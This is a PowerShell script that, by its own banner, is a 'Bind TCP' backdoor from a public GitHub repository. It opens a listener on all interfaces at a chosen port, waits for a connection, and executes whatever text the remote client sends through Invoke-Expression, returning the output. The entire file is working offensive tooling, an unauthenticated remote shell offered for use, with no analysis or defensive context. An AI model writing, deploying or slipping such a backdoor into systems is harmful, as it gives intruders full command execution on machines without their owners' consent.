$port = $(Read-Host -Prompt "Enter port number").Trim();
Write-Host "";
if ($port.Length -lt 1) {
	Write-Host "Port number is required";
} else {
	Write-Host "PowerShell Bind TCP v4.0 by Ivan Sincek.";
	Write-Host "GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp.";
	$listener = $client = $stream = $buffer = $writer = $data = $result = $null;
	try {
		$listener = New-Object Net.Sockets.TcpListener("0.0.0.0", $port);
		$listener.Start();
		Write-Host "Backdoor is up and running...";
		Write-Host "";
		Write-Host "Waiting for client to connect...";
		Write-Host "";
		do {
			# non-blocking method
			if ($listener.Pending()) {
				$client = $listener.AcceptTcpClient();
			} else {
				Start-Sleep -Milliseconds 500;
			}
		} while ($client -eq $null);
		$listener.Stop();
		$stream = $client.GetStream();
		$buffer = New-Object Byte[] 1024;
		$encoding = New-Object Text.UTF8Encoding;
		$writer = New-Object IO.StreamWriter($stream, [Text.Encoding]::UTF8, 1024);
		$writer.AutoFlush = $true;
		Write-Host "Client has connected!";
		Write-Host "";
		$bytes = 0;
		do {
			$writer.Write("PS>");
			do {
				$bytes = $stream.Read($buffer, 0, $buffer.Length); # blocking
				if ($bytes -gt 0) {
					$data += $encoding.GetString($buffer, 0, $bytes);
				}
			} while ($stream.DataAvailable);
			if ($bytes -gt 0) {
				$data = $data.Trim();
				if ($data.Length -gt 0) {
					try {
						$result = Invoke-Expression -Command $data 2>&1 | Out-String;
					} catch {
						$result = $_.Exception | Out-String;
					}
					Clear-Variable data;
					if ($result.Length -gt 0) {
						$writer.Write($result);
						Clear-Variable result;
					}
				}
			}
		} while ($bytes -gt 0);
		Write-Host "Client has disconnected!";
	} catch {
		Write-Host $_.Exception.InnerException.Message;
	} finally {
		if ($listener -ne $null) {
			$listener.Server.Close(); $listener.Server.Dispose();
			Clear-Variable listener;
		}
		if ($writer -ne $null) {
			$writer.Close(); $writer.Dispose();
			Clear-Variable writer;
		}
		if ($stream -ne $null) {
			$stream.Close(); $stream.Dispose();
			Clear-Variable stream;
		}
		if ($client -ne $null) {
			$client.Close(); $client.Dispose();
			Clear-Variable client;
		}
		if ($buffer -ne $null) {
			$buffer.Clear();
			Clear-Variable buffer;
		}
		if ($result -ne $null) {
			Clear-Variable result;
		}
		if ($data -ne $null) {
			Clear-Variable data;
		}
		[GC]::Collect();
	}
}
Clear-Variable port;
